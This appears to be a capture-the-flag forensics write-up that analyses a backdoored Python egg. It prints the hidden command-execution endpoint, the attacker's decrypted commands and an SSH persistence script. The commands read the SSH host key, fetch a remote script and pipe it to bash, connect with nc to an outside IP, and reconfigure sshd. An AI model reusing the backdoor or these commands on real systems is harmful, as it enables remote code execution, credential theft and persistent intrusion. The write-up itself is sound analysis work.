In our newly-obtained archive, we can find an egg file.

Eggfile are basicly python files zipped, so i renamed it "file.zip" and unzipped it.

After reading the source code, i found this code which seems... Interesting.

```python
class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                result = subprocess.getoutput(cmd)
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()        
                return result, 200
        except Exception as e:
            return str(e), 501
```

Basically, it uses the cmd parameter to execute a command, and then returns its output.
Also, it's encrypted using ECB, with our flag as key.

The output is also encrypted and sent as a response.

That looks much like a persistance.

I know ECB isn't quite safe, but this isn't a crypto chall, so i hope i won't have to mess with it !
Data/flag.txt is probably the flag we found on our previous archive, i hope...

So, let's look in logs for requests containing the Get argument "cmd".

I also found its route:
```python
# Client API's only accesible through Auth Token.
api.add_resource(Status, '/api/v1/cav/client/status')
api.add_resource(Health, '/api/v1/cav/client/health')
api.add_resource(AuthToken, '/api/v1/cav/client/auth_token')
```

I saw some requests inside the logs:
```python
GET /api/v1/cav/client/health?cmd=DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D
GET /api/v1/cav/client/health?cmd=K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D
GET /api/v1/cav/client/health?cmd=/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D
GET /api/v1/cav/client/health?cmd=Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D
GET /api/v1/cav/client/health?cmd=yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D
 GET /api/v1/cav/client/health?cmd=E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT
 GET /api/v1/cav/client/health?cmd=7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D
GET /api/v1/cav/client/health?cmd=WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D
GET /api/v1/cav/client/health?cmd=G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D
GET /api/v1/cav/client/health?cmd=QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D
```
Okay, time to decode !

I'll use the same script, why would i bother :)

Here it is:
```python
import base64
import subprocess
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from flask import request

requests=[
    "DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA=",
    "K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ=",
    "/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ==",
    "Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA==",
    "yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ+74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ+/o=",
    "E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7+yv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT",
    "7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn+XeiWHpCWr+yyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD+0nZc8=",
    "WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz+JxmwQdxnJwNg==",
    "G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM=",
    "QV2ImqgrjrL7+tofpO12S9bqgDCRHYXGJwaOIihb+NI="
]

with open("flag.txt", "r") as handle:
    dskey = handle.read().replace("\n", "")

    for data in requests:    
        if data:
            aes = AES.new(dskey.encode(), AES.MODE_ECB)
            cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
            print(cmd)
```

And the output i've got, including a flag !
```bash
b'id'
b'ls /'
b'echo FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}'
b'cat /data/runtime/etc/ssh/ssh_host_rsa_key'
b'/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a'
b'cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d \'"\' -f 2 | tr -d \'\n\' | grep -o . | tac | tr -d \'\n\'  > /tmp/b'
b'a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep \'raw_url\' | cut -d \'"\' -f 4 > /tmp/c'
b'c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash'
b'rm /tmp/a /tmp/b /tmp/c'
b'nc 146.0.228.66:1337'
```

Also, i ran the commands (without executing them with bash), and here's what i found:
```bash
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
pkill sshd-ive > /dev/null 2>&1
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
```

Might be useful for part 4, maybe.